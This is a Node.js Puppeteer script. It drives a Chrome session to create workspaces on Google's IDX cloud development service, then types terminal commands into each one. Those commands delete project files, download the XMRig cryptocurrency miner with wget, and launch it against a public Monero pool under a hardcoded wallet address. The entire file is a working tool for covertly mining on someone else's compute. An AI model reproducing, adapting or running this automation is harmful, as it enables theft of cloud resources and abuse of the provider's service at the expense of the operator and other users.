// monaco-dialog-modal-block

const puppeteer = require('puppeteer');
const { exec } = require('child_process');
// const os = require('os'); // Add this at the top

const machineName = 'hh';
console.log(`Running on machine: ${machineName}`);

const workerName = 'dnd_' + machineName

async function waitForClassToExist(page, classSelector, maxWaitTimeMs = 5 * 60 * 1000, checkIntervalMs = 10 * 1000) {
    console.log(`Starting to wait for class '${classSelector}' to appear...`);
    const startTime = Date.now();

    let classFound = false;
    while (!classFound && (Date.now() - startTime < maxWaitTimeMs)) {
        try {
            // Check if the element exists and is visible
            const element = await page.$(classSelector);
            if (element) {
                const isVisible = await page.evaluate((el) => {
                    const style = window.getComputedStyle(el);
                    return style && style.display !== 'none' && style.visibility !== 'hidden' && style.opacity !== '0';
                }, element);

                if (isVisible) {
                    classFound = true;
                    console.log(`Found element with class '${classSelector}' after ${Math.round((Date.now() - startTime) / 1000)} seconds`);
                    return true;
                }
            }
            // Wait before checking again
            console.log(`Class '${classSelector}' not found yet, checking again in ${checkIntervalMs / 1000} seconds...`);
            await new Promise(resolve => setTimeout(resolve, checkIntervalMs));
        } catch (error) {
            console.log(`Error while checking for class: ${error.message}`);
            await new Promise(resolve => setTimeout(resolve, checkIntervalMs));
        }
    }

    if (!classFound) {
        console.log(`Timed out waiting for class '${classSelector}' after ${maxWaitTimeMs / 1000} seconds`);
    }
    return false;
}

const runCMD = async (page, name) => {

    await new Promise(resolve => setTimeout(resolve, 40 * 1000));
    await page.keyboard.down('Shift');
    await page.keyboard.down('Meta'); // 'Meta' is Command on Mac
    await page.keyboard.press('c');
    await page.keyboard.up('Meta');
    await page.keyboard.up('Shift');

    console.log('Pressed Shift+Command+C');

    const commands = [
        "rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md",
        " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
        " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
        " && cd xmrig-6.22.2",
        " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
    ];

    for (const cmd of commands) {
        await page.keyboard.type(cmd);
        // Small delay between chunks to ensure proper typing
        await new Promise(resolve => setTimeout(resolve, 100));
    }
}

const initConnection = async (port) => {
    // Connect to the already running Chrome instance
    const browser = await puppeteer.connect({
        browserURL: 'http://localhost:' + port,
        defaultViewport: null,
    });

    // Open a new tab (page)
    const page = await browser.newPage();
    await page.goto('https://idx.google.com/new/react-native');


    console.log('New tab opened in existing Chrome!');
    await page.waitForSelector('#mat-input-0');

    // Type text into the input with ID mat-input-0
    await page.type('#mat-input-0', workerName);


    await page.keyboard.press('Enter');
    // Wait for 2 seconds before pressing Enter
    // await page.waitForTimeout(2000); 
    await new Promise(resolve => setTimeout(resolve, 1000));

    const currentUrl = await page.url();
    console.log('Current URL path:', currentUrl);
    return page;
}


const openChrome_ = async (port) => {
    // const chromePath = '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"';
    const chromePath = '/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome'; // macOS path
    const remoteDebugCmd = `${chromePath} --remote-debugging-port=${port} --user-data-dir=`;
    //  --user-data-dir="/tmp/chrome-profile"
    return new Promise((resolve, reject) => {
        exec(remoteDebugCmd, (error) => {
            if (error) {
                console.error(`Error launching Chrome: ${error.message}`);
                reject(error);
            } else {
                console.log('Chrome launched with remote debugging');
                resolve();
            }
        });
    });
}


const openChrome = async (port) => {
    // For macOS, no need for escape sequences in the variable itself
    const chromePath = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';
    
    // When passing to exec, properly escape spaces and quotes
    const remoteDebugCmd = `"${chromePath}" --remote-debugging-port=${port} --user-data-dir=/tmp/chrome-profile1`;
    
    return new Promise((resolve, reject) => {
        console.log('Executing:', remoteDebugCmd);
        exec(remoteDebugCmd, (error) => {
            if (error) {
                console.error(`Error launching Chrome: ${error.message}`);
                reject(error);
            } else {
                console.log('Chrome launched with remote debugging');
                resolve();
            }
        });
    });
}

const main = async (port) => {
    try {
        // openChrome(port);
        const page = await initConnection(port);
        const classFound = await waitForClassToExist(page, '.is-loaded');
        if (!classFound) {
            console.log('Class not found, exiting...');
            await browser.close();
            return;
        }
        await runCMD(page, workerName);
        await page.keyboard.press('Enter');
        console.log('Text typed into currently focused element');

    } catch (error) {
        console.error('Error killing Chrome:', error);
    }
}
(async () => {
    // main(9222);
    main(9224);
})();